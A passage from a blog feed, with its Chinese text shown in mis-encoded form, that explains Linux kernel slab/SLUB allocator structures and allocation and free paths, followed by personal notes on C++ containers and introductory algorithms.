å­è¢«slab_cacheç®¡ç†ï¼ŒåŒæ—¶ä»–ä»¬å‘ä¸Šçº§buddyç”³è¯·å†…å­˜ã€‚</p><p>å¯¹äºè€ä¸€ç‚¹çš„å†…æ ¸ç‰ˆæœ¬æ¯”å¦‚5.4ï¼Œslabå¹¶æ²¡æœ‰å•ç‹¬çš„ç»“æ„ä½“è¿›è¡Œç®¡ç†ï¼Œè€Œæ˜¯å…¨éƒ¨å­˜å‚¨åœ¨pageä¸­ã€‚ä½†éšç€å†…æ ¸çš„å‘å±•ï¼Œæˆ‘ä»¬éœ€è¦å¯¹pageç»“æ„ä½“è¿›è¡Œç²¾ç®€ï¼Œä¹Ÿå°±å°†slabç»“æ„å•ç‹¬æŠ½äº†å‡ºæ¥ä»è€Œå‡å°‘pageç»“æ„ä½“çš„å¤§å°ã€‚ä½†æ˜¯pageè¯¥æœ‰çš„æŒ‡é’ˆä»€ä¹ˆçš„è¿˜æ˜¯å¾—æœ‰ã€‚</p><blockquote><p>linux-5.18.19</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* array of free object indexes */</span></span><br><span class="line"><span class="type">void</span> *s_mem;<span class="comment">/* first object */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> slabs;<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLOB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="type">void</span> *__unused_1;</span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free block */</span></span><br><span class="line"><span class="type">long</span> units;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused_2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>freelistç›´æ¥æŒ‡å‘å½“å‰çš„ç©ºé—²å¯¹è±¡ï¼Œæ¯ä¸ªç©ºé—²å¯¹è±¡åˆ™åŒæ—¶ä»¥é“¾è¡¨çš„å½¢å¼ç›¸äº’è¿æ¥ã€‚slabä¸å•ç‹¬ç»´æŠ¤ç©ºé—²çš„å¯¹è±¡ï¼Œä»–ä»¬éƒ½æ˜¯åŒæ—¶è¿ç»­å­˜æ”¾çš„ï¼Œå¦‚æœå…¨freeäº†å°±ç›´æ¥æ”¾è¿›kmem_cacheçš„free,åªæœ‰partialçš„æ—¶å€™ä¼šç”¨freelist-&gt;object.nextè¿™ç§å½¢å¼è¿æ¥ä¸€ä¸ªå†…éƒ¨ç©ºé—²å¯¹è±¡é“¾è¡¨ã€‚</p><p>slabå…¶å®æœ¬èº«æ²¡å•¥å†…å®¹ï¼Œå¤§å¤´éƒ½è®©kmem_cacheå¹²äº†ã€‚</p><blockquote><p>æ—§ç‰ˆçš„slabé‡‡ç”¨ä¸€ä¸ªæè¿°ç¬¦æ•°ç»„æ¥ç®¡ç†å¯¹è±¡çš„åˆ†é…å’Œé‡Šæ”¾ï¼Œè€Œä¸”slabå†…åŒæ ·ç»´æŠ¤äº†</p></blockquote><h3 id="Object">Object</h3><p>æ¯ä¸ªObjectæ˜¯ç”±slabå»åˆ†é…ï¼ŒçœŸæ­£è¿”å›ç»™å†…æ ¸ç¨‹åºä½¿ç”¨çš„ã€‚åªä¸è¿‡å’Œchunkç›¸æ¯”ï¼ŒObjectä¼¼ä¹ç®¡ç†å’Œç»“æ„éƒ½æ—¢æ›´åŠ ç®€å•åˆæ›´åŠ å¤æ‚ã€‚</p><p>è¯´æ›´åŠ ç®€å•ï¼Œæ˜¯å› ä¸ºä»–ä»¬ä¸éœ€è¦åƒbinç´¢å¼•è¿™æ ·çš„æ–¹æ³•ï¼Œæ²¡æœ‰fdbké‚£ä¹ˆå¤šä¸œè¥¿ï¼Œéƒ½æ˜¯çº¿æ€§æ˜ å°„ã€‚é¡¶å¤©äº†ä¹Ÿå°±æ˜¯partialçš„éå†ä»¥ä¸‹ï¼Œç›´æ¥slubç”¨ä¸€ä¸ªfree_listæŒ‡é’ˆæŒ‡åˆ°æ²¡åˆ†é…çš„å¯¹è±¡ï¼Œå–çš„æ—¶å€™å‡ ä¹æ˜¯ä¸€é”®è¿”å›ã€‚</p><p>è¯´æ›´åŠ å¤æ‚ï¼Œæ˜¯å› ä¸ºåœ¨å†…æ ¸ä¸­è¿˜æœ‰å…¶ä»–çš„å¥‡æ€ªæœºåˆ¶ï¼ˆéƒ¨åˆ†æ˜¯å¯é…ç½®çš„ï¼‰ã€‚æ¯”å¦‚é˜²æ­¢è¶Šç•Œè¯»å†™çš„red_zone, ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦å¡«å……objectçš„slab_poisonç­‰ç­‰ã€‚å‰è€…æ˜¯ä¼šåœ¨objectä¸¤ä¾§ç©ºä½™ç©ºé—´é˜²è¶Šç•Œè¯»å†™ï¼ˆå’Œå†…å­˜å¯¹é½ç»“åˆèµ·æ¥åˆ©ç”¨ï¼‰ï¼Œåè€…åˆ™æ˜¯ç”¨0x6bå¡«å……å¯¹è±¡å¹¶ä»¥0x5aç»“å°¾ï¼Œåœ¨å®ƒä»¬é‡Šæ”¾æˆ–è€…åˆšä»buddyå–å‡ºçš„æ—¶å€™ã€‚å¦å¤–è¿˜éœ€è¦å…¶ä»–çš„trackä¿¡æ¯æ¥é™„åŠ åœ¨objectæœ«å°¾ï¼Œå› æ­¤æœ€åä¸€ä¸ªobjectå¤§æ¦‚æ˜¯è¿™æ ·çš„ç»“æ„ï¼š</p><p><img src="/images/linux_mem/object.png" alt="object.png"></p><h2 id="åˆ†é…ä¸é‡Šæ”¾ï¼ˆç®€åŒ–æ¦‚è¿°ï¼‰">åˆ†é…ä¸é‡Šæ”¾ï¼ˆç®€åŒ–æ¦‚è¿°ï¼‰</h2><blockquote><p><a href="https://segmentfault.com/a/1190000043626203#item-6">https://segmentfault.com/a/1190000043626203#item-6</a><br>å†™å¾—å¾ˆå¥½ï¼Œæˆ‘åªæ˜¯è‡ªå·±ç†è§£åæŠ„ä¸€éç½¢äº†ï¼Œå¾ˆéš¾æƒ³è±¡ç†è§£è¿™ä¹ˆæ·±åˆ»çš„å¤§ä½¬èƒ½å†™å’Œç”»çš„è¿™ä¹ˆç›´è§‚</p></blockquote><h3 id="åˆ†é…">åˆ†é…</h3><ul class="lvl-0"><li class="lvl-2"><p>ä»cpuç¼“å­˜ä¸­ç›´æ¥åˆ†é…ï¼Œkmem_cpu_cache-&gt;slabå–ï¼Œæˆ‘ä»¬ç§°ä¸ºå¿«é€Ÿè·¯å¾„ï¼Œå¦‚æœæœ‰ç©ºé—²å¯¹è±¡freelistç›´æ¥å–å‡ºå¯¹è±¡è¿”å›</p></li><li class="lvl-2"><p>freelistä¸ºç©ºï¼Œkmem_cpu_cache-&gt;slabå·²ç»æ»¡ï¼Œåˆ™ä»cpuç¼“å­˜partialä¸­åˆ†é…ï¼Œæˆ‘ä»¬ç§°ä¸ºæ…¢é€Ÿè·¯å¾„ï¼Œéœ€è¦éå†æŸ¥çœ‹ï¼Œæ‰¾åˆ°èƒ½åˆ†é…çš„slabåå°†è¯¥slabæå‡è‡³cacheå¹¶åˆ†é…</p></li><li class="lvl-2"><p>partialä¹Ÿè¢«å–å®Œäº†ï¼Œåˆ™è¦è¿”å›kmem_cacheç»“æ„ï¼Œä»nodeçš„partialé“¾è¡¨ä¸­æ‰¾ï¼Œéå†ä¸€éï¼ŒåŒæ ·æ‰¾åˆ°åæå‡è‡³cpu_cache, å¹¶ä¸”å°†å‰©ä½™çš„slabå…¨éƒ¨è¿æ¥åˆ°cpu_cache-&gt;partialä¸‹ï¼ˆæ•°é‡æœ‰é™åˆ¶ï¼‰</p></li><li class="lvl-2"><p>å…¨ç©ºäº†ï¼ˆæ¯”å¦‚åˆšåˆ›å»ºï¼‰ï¼Œä»buddyç”³è¯·ï¼Œä¾æ®kmem_cacheçš„å­—æ®µå»è¦ï¼Œè¦åˆ°slabç›´æ¥æå‡åˆ°cpuç¼“å­˜</p></li><li class="lvl-2"><p>æ‹¿åˆ°åä¼šç»è¿‡æ± åŒ–ï¼Œslab poisonç­‰ç­‰ç»†èŠ‚æ“ä½œä¸å†èµ˜è¿°</p></li></ul><h3 id="é‡Šæ”¾">é‡Šæ”¾</h3><ul class="lvl-0"><li class="lvl-2"><p>å¦‚æœé‡Šæ”¾çš„å¯¹è±¡åœ¨cpu_cache-&gt;slabä¸­ï¼Œé‚£å°±ç›´æ¥æ”¾å›è¯¥slabå¹¶ä¿®æ­£freelistæŒ‡é’ˆï¼Œæˆ‘ä»¬ç§°ä¸ºå¿«é€Ÿè·¯å¾„</p></li><li class="lvl-2"><p>å¦‚æœé‡Šæ”¾çš„å¯¹è±¡åœ¨cpu_cache-&gt;partialä¸­ï¼Œä¹Ÿæ˜¯ç›´æ¥æ”¾å›ç„¶åä¿®æ”¹free_listå’Œpointer</p></li><li class="lvl-2"><p>å¦‚æœé‡Šæ”¾çš„å¯¹è±¡åœ¨kmem_cache_node-&gt;partialä¸­ï¼Œä¹Ÿæ˜¯ç›´æ¥æ”¾å›</p></li><li class="lvl-2"><p>å¦‚æœå¯¹è±¡é‡Šæ”¾åï¼ŒåŸæœ¬çš„fullå˜ä¸ºäº†partialï¼Œä¸”ä¸åœ¨cpuæœ¬åœ°ç¼“å­˜ä¸­ï¼Œé‚£ä¹ˆå†…æ ¸ä¼šå°†è¿™ä¸ªslabé‡æ–°æ’å…¥åˆ°cpu_cacheçš„partialé“¾è¡¨ä¸­ã€‚</p></li></ul><blockquote><p>å› ä¸º slab ä¹‹å‰ä¹‹æ‰€ä»¥æ˜¯ä¸€ä¸ª full slabï¼Œæ°æ°è¯æ˜äº†è¯¥ slab æ˜¯ä¸€ä¸ªéå¸¸æ´»è·ƒçš„ slabï¼Œå¸¸å¸¸ä¾›ä¸åº”æ±‚å¯¼è‡´å˜æˆäº†ä¸€ä¸ª full slabï¼Œå½“å¯¹è±¡é‡Šæ”¾ä¹‹åï¼Œåˆšå¥½å˜æˆ partial slabï¼Œè¿™æ—¶éœ€è¦å°†è¿™ä¸ªè¢«é¢‘ç¹è®¿é—®çš„ slab æ”¾å…¥ cpu ç¼“å­˜ä¸­ï¼ŒåŠ å¿«ä¸‹æ¬¡åˆ†é…å¯¹è±¡çš„é€Ÿåº¦ã€‚</p></blockquote><p>å½“ç„¶ï¼Œcpu_cacheæ˜¯å¾ˆå®è´µçš„ï¼Œæˆ‘ä»¬ä¸èƒ½ä»€ä¹ˆéƒ½å¾€é‡Œå¡ã€‚kmem_cache-&gt;cpu_partialè§„å®šäº†ä¸€ä¸ªæ•°é‡ï¼Œè¶…è¿‡çš„è¯å°±ä¼šå°†æ‰€æœ‰çš„cpu partialè½¬ç§»åˆ°kmem_nodeçš„partialä¸­ã€‚è¿™ä¸ªæ£€æŸ¥æ˜¯ç¬¬ä¸€ä½çš„ã€‚è¿™ä¹Ÿæ˜¯æœ‰è¯´æ³•çš„ï¼š</p><blockquote><p>CPU partialçˆ†ç‚¸çš„æ—¶å€™ï¼Œè¯´æ˜å†…æ ¸å½“å‰æ‰€å¤„çš„åœºæ™¯æ˜¯ä¸€ä¸ªå†…å­˜é‡Šæ”¾é¢‘ç¹çš„åœºæ™¯ã€‚kmem_cache_cpu-&gt;partial é“¾è¡¨å¤ªæ»¡äº†ï¼Œè€Œå†…å­˜åˆ†é…çš„è¯·æ±‚åˆä¸æ˜¯å¾ˆå¤šï¼Œkmem_cache_cpu ä¸­ç¼“å­˜çš„ slab å¹¶ä¸ä¼šé¢‘ç¹çš„æ¶ˆè€—ã€‚è¿™æ ·ä¸€æ¥ï¼Œå°±éœ€è¦å°†é“¾è¡¨ä¸­çš„æ‰€æœ‰ slab ä¸€æ¬¡æ€§è½¬ç§»åˆ° NUMA èŠ‚ç‚¹ç¼“å­˜ partial é“¾è¡¨ä¸­å¤‡ç”¨ã€‚</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>å¦‚æœå¯¹è±¡é‡Šæ”¾åï¼Œslabä»partialå˜æˆäº†emptyï¼Œå†…æ ¸ä¼šå°†è¯¥slabæ’å…¥èŠ‚ç‚¹ç¼“å­˜ï¼Œä¹Ÿå°±æ˜¯kmem_cache_node-&gt;partialä¸­</p></li></ul><p>èˆå¼ƒäº†slabä¸­çš„emptyï¼Œå…¨æ”¾è¿›partialçš„è¯å°±éœ€è¦ä¸€äº›æµç¨‹ã€‚kmem_cache-&gt;min_partialä¸­è§„å®šäº†nodeä¸­ç¼“å­˜çš„slabä¸ªæ•°ä¸Šé™ã€‚partialè¶…è¿‡è¿™ä¸ªå€¼ä¼šå°†æ‰€æœ‰çš„empty slabå›æ”¶è‡³buddy system.è¿™ä¸ªæ£€æŸ¥ä¹Ÿæ˜¯æ’å…¥å‰ä¼˜å…ˆè¿›è¡Œ</p><h2 id="æ€»ç»“">æ€»ç»“</h2><p>è‡³æ­¤ï¼Œslab/slubçš„æ¶æ„å¦‚ä¸‹ï¼š</p><p><img src="/images/linux_mem/construct.png" alt="architect.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œè¿›ç¨‹å†…éƒ¨å¯»å€ç”¨çš„æ˜¯è™šæ‹Ÿåœ°å€ï¼Œè™šæ‹Ÿåœ°å€è¦ç»è¿‡mmuè¢«æ˜ å°„åˆ°ç‰©ç†åœ°å€ï¼Œè¿›ç¨‹çš„é¡µè¡¨æ˜¯ç‹¬ç«‹çš„ç­‰ç­‰ã€‚ä½†æ˜¯é‚£ä¹ˆå¤šé¡µè¡¨ï¼Œå†…æ ¸åˆæ˜¯æ€ä¹ˆè°ƒåº¦é¡µè¡¨çš„å‘¢ï¼Ÿåœ¨æˆ‘ä»¬å‘å†…æ ¸ç”³è¯·ä¸‹ä¸€ä¸ª4kbçš„æ—¶å€™ç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å‚è€ƒè‡ªï¼š&lt;a href=&quot;https:</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm(0)</title>
    <link href="https://zjw1nd.github.io/2024/10/28/Algorithm-0/"/>
    <id>https://zjw1nd.github.io/2024/10/28/Algorithm-0/</id>
    <published>2024-10-28T08:20:57.000Z</published>
    <updated>2024-12-02T09:16:28.851Z</updated>
    
    <content type="html"><![CDATA[<h1>C++æ¨¡æ¿åº“çš„ä½¿ç”¨</h1><p>ä¸»è¦åŒ…æ‹¬ï¼š</p><ol><li class="lvl-3">åºåˆ—å¼å®¹å™¨ï¼šarrayï¼ˆå®šé•¿ï¼‰ï¼Œvectorï¼ˆå•å‘æ’å…¥ï¼‰ï¼Œdequeï¼ˆåŒå‘æ’å…¥ï¼‰ï¼Œlistï¼ˆåŒå‘é“¾è¡¨ï¼‰ï¼Œforwardlistï¼ˆå•å‘é“¾è¡¨ï¼‰</li><li class="lvl-3">å…³è”å¼å®¹å™¨ï¼ˆèŠ‚ç‚¹ç»„æˆçš„çº¢é»‘æ ‘ï¼‰ï¼šsetï¼ˆé›†åˆï¼Œæœ‰åºå­˜å‚¨äº’å¼‚å…ƒç´ ï¼‰ï¼Œmultisetï¼ˆå…è®¸ç›¸ç­‰ï¼‰ï¼Œmapï¼ˆé”®å€¼å¯¹ï¼Œå­—å…¸/hashmapï¼‰ï¼Œmultimapï¼ˆå…è®¸keyç›¸ç­‰ï¼‰</li><li class="lvl-3">æ— åºï¼ˆå…³è”å¼å®¹å™¨ï¼‰ï¼šunordered_set/multiset, unordered_map/multimapï¼Œæ— åºï¼Œåªå…³å¿ƒå­˜åœ¨</li></ol><h2 id="åŸºç¡€ï¼Œç†Ÿæ‚‰è¾“å…¥è¾“å‡º">åŸºç¡€ï¼Œç†Ÿæ‚‰è¾“å…¥è¾“å‡º</h2><ul class="lvl-0"><li class="lvl-2"><p>size clearç­‰åŸºæœ¬æ–¹æ³•</p></li><li class="lvl-2"><p>è¿­ä»£å™¨</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator iter = data.<span class="built_in">begin</span>(); iter != data.<span class="built_in">end</span>(); iter++)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> iter=data.<span class="built_in">begin</span>();...;...)</span><br></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>scanfè¾“å…¥ printfè¾“å‡º åœ¨C++ä¸­ä½¿ç”¨ä»–ä»¬ä¹Ÿæ›´å¥½</p></li><li class="lvl-2"><p>é•¿å­—ç¬¦ä¸²æ¢è¡Œ</p></li><li class="lvl-2"><p>å¼€double å¼€longlong</p></li></ul><h1>åŸºç¡€ç®—æ³•</h1><blockquote><p>mainå‡½æ•°å¿…é¡»æ˜¯intè¿”å›å¿…é¡»return0</p></blockquote><h2 id="æš´åŠ›ç ´è§£">æš´åŠ›ç ´è§£</h2><p>æšä¸¾éª—åˆ†</p><p>åŒ…å«å¤´æ–‡ä»¶<code>#include&lt;algorithm&gt;</code>ï¼Œé‡Œé¢æœ‰å¸¸ç”¨çš„å®¹å™¨ç®—æ³•ï¼ŒåŒ…æ‹¬æ’åºï¼ŒæŸ¥æ‰¾ç­‰ç­‰ï¼Œä¸ç”¨é€ è½®å­ã€‚</p><p>å¤´æ–‡ä»¶<code>#include&lt;ctype.h&gt;</code>åŒ…å«å¤§å°å†™è½¬æ¢ï¼Œå­—æ¯æ•°å­—åˆ¤æ–­</p><p>æ‰“è¡¨ï¼Œç”¨äº‹å…ˆå†™å¥½çš„å¸¸é‡å­—ç¬¦ä¸²ä¼˜åŒ–ç¨‹åº</p><h2 id="æ¨¡æ‹Ÿ">æ¨¡æ‹Ÿ</h2><h1>è¯¾å ‚ç®—æ³•åˆ†æç¬”è®°Lesson1</h1><h2 id="èƒŒåŒ…é—®é¢˜çš„æ±‚è§£">èƒŒåŒ…é—®é¢˜çš„æ±‚è§£</h2><p>è´ªå¿ƒ</p><h2 id="å¤šé¡¹å¼æ—¶é—´ç®—æ³•">å¤šé¡¹å¼æ—¶é—´ç®—æ³•</h2><p>è¾“å…¥é•¿åº¦ç¿»å€ï¼Œè¿è¡Œæ—¶é—´æœ€å¤šä¼šæ…¢å¸¸æ•°å€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›éšç€nçš„å¢é•¿ï¼Œå¤šæ¶ˆè€—çš„æ—¶é—´è¢«nå½±å“å¤ªå¤šã€‚1ï¼š1çš„å¢é•¿å·²ç»å¾ˆå¥½äº†ã€‚å¤šé¡¹å¼ç®—æ³•ä¸­ï¼Œaå’Œbé€šå¸¸ä¸ä¼šå¤ªå¤§</p><h2 id="æ¸è¿›åˆ†æ">æ¸è¿›åˆ†æ</h2><ul class="lvl-0"><li class="lvl-2"><p>æ¸è¿›ä¸Šç•Œï¼š$O(g(n))$æ„å‘³ç€ï¼Œå¯¹äºfnæ¥è¯´ï¼Œå­˜åœ¨ä¸€ä¸ªè¶³å¤Ÿå¤§çš„cå’Œn0ï¼Œæ»¡è¶³ä»»æ„çš„$n&gt;=n_0$ï¼Œ$0&lt;=f(n)&lt;=cg(n)$ã€‚â€œæœ€å·®æƒ…å½¢â€</p></li><li class="lvl-2"><p>æ¸è¿›ä¸‹ç•Œï¼šåŒç†çš„è¯´æ³•ï¼Œå­˜åœ¨cåœ¨nè¶³å¤Ÿå¤§çš„æ—¶å€™â€¦</p></li><li class="lvl-2"><p>æ¸è¿›ç´§ç•Œï¼šæ—¢æ˜¯åˆæ˜¯ï¼Œä¾‹å­ï¼šfn=32n2+17n+1ï¼Œn2æ—¢æ˜¯ä¸Šç•Œåˆæ˜¯ä¸‹ç•Œ</p></li></ul><blockquote><p>ä»»ä½•åŸºäºæ¯”è¾ƒçš„æ’åºç®—æ³•æœ€å·®æƒ…å†µä¸‹éƒ½éœ€è¦æ¯”è¾ƒè‡³å°‘$O(nlogn)$æ¬¡ â€”-è¿™æ˜¯é”™çš„æ—¶é—´å¤æ‚åº¦çš„é™åˆ¶å¹¶ä¸é™åˆ¶åšå‡ éï¼Œlognæˆ‘äºŒåˆ†æŸ¥10æ¬¡ä¹Ÿæ˜¯logn<br>å¾ªç¯æ•°ç»„æŸ¥æ‰¾ï¼šå¯ä»¥ç¡®å®šæ‹ç‚¹åŠ å·¦å³äºŒåˆ†</p></blockquote><h1>Lesson2 å›¾</h1><ul class="lvl-0"><li class="lvl-2"><p>è¿é€šæ€§é—®é¢˜</p></li><li class="lvl-2"><p>æœ€çŸ­è·¯å¾„</p></li><li class="lvl-2"><p>æœç´¢<br>BFSæ ‘ï¼šæŒ‰BFSæœç´¢é¡ºåºï¼ˆæ¯ä¸€å±‚Liç”»æ ‘çš„ä¸€å±‚ï¼‰ï¼Œä¸­é—´è¿è™šçº¿ï¼ˆå¯ä»¥ä¸ç”»ï¼‰</p></li></ul><blockquote><p>ç»“è®ºï¼šåŸå›¾ä¸­æœ‰è¾¹çš„ä¸¤ä¸ªç‚¹åœ¨BFSæ ‘ä¸­å±‚æ•°è‡³å¤šç›¸å·®1<br>åœæ­¢ï¼šæ‰€æœ‰å½“å‰è½®æ¬¡çš„ç‚¹çš„é‚»å±…éƒ½å·²ç»å‡ºç°åœ¨å·²æœç´¢è¿‡çš„ç‚¹é›†é‡Œ<br>äº‹å®ä¸Šï¼Œåªè¦é€šè¿‡ä¸€ä¸ªç¡®å®šæ€§çš„æ­¥éª¤ï¼ˆæœªå¿…æ˜¯BFS,DFSï¼‰ï¼Œæ¯æ¬¡æ‰¾é‚»å±…ï¼Œæ€»èƒ½æ‰¾åˆ°æ‰€æœ‰ç‚¹ã€‚åªæ˜¯ä»£ç é€»è¾‘ä¼šæ¸…æ™°</p></blockquote><p>è¿é€šåˆ†æ”¯ï¼šä¸€ä¸ª<strong>ç‚¹é›†</strong>è€Œéä¸€ä¸ªå­å›¾ã€‚åŒ…å«Sçš„è¿é€šåˆ†æ”¯æŒ‡ä»så‡ºå‘èƒ½åˆ°è¾¾çš„ç‚¹é›†</p><p>DFSæ ‘</p><p>æœ‰å‘å›¾ï¼Œå¼ºè¿é€šï¼ˆç›¸äº’å¯åˆ°è¾¾ï¼‰â€”â€”å¼ºè¿é€šçš„åˆ¤æ–­ï¼ˆKosarajuç®—æ³•ï¼Œåå‘è¾¹ä¸¤æ¬¡BFSï¼‰ä¸ºä»€ä¹ˆï¼Ÿ</p><p>æœ‰å‘æ— ç¯å›¾ï¼ˆDAGï¼‰å’Œæ‹“æ‰‘æ’åºï¼šå¦‚æœgä¸­åŒ…å«ä¸€ä¸ªæ‹“æ‰‘æ’åºï¼Œåˆ™Gå¿…å®šæ˜¯ä¸€ä¸ªæœ‰å‘æ— ç¯å›¾</p><p><strong>å¦‚ä½•é€‰æ‹©æ•°æ®ç»“æ„ï¼šçœ‹æˆ‘ä»¬åœ¨å¹²å˜›ï¼Œå¢åˆ æŸ¥æ”¹å“ªä¸ªæ›´å¤šï¼Œä¸åŒçš„æ•°æ®ç»“æ„æ“…é•¿ä¸åŒçš„æ“ä½œ</strong> å¦‚DAGçš„æ‹“æ‰‘æ’åºï¼šæ€»æ˜¯æŸ¥æ‰¾æŸä¸ªï¼ˆå…¥è¾¹ï¼‰é‡æœ€å°çš„ç‚¹â€“ä¼˜å…ˆé˜Ÿåˆ—</p><h1>Lesson3 è´ªå¿ƒ</h1><p>å¤§æ–¹å‘åªæœ‰ è´ªå¿ƒ åˆ†æ²» åŠ¨æ€è§„åˆ’<br>æŒ‰æŸç§é¡ºåºæ’åºï¼Œè´ªå¿ƒçš„å…³é”®æ˜¯ç¡®å®šæ¯”è¾ƒçš„ä¾æ®</p><h2 id="åŒºé—´è°ƒåº¦é—®é¢˜">åŒºé—´è°ƒåº¦é—®é¢˜</h2><p>è®°ä¸€ä¸‹æœ€å°‘å†²çªåŒºé—´çš„åä¾‹å›¾<br>ç®—æ³•åä¾‹ å¿…è€ƒ</p><p>åè¯æœ€æ—©å®Œæˆæ—¶é—´æ˜¯æœ€ä¼˜ç­–ç•¥ï¼šå‡è®¾å®ƒä¸æœ€ä¼˜ç„¶åå’Œæœ€ä¼˜å¯¹æ¯”ï¼Œæ‰¾æœ€å¼€å§‹ä¸ä¸€æ 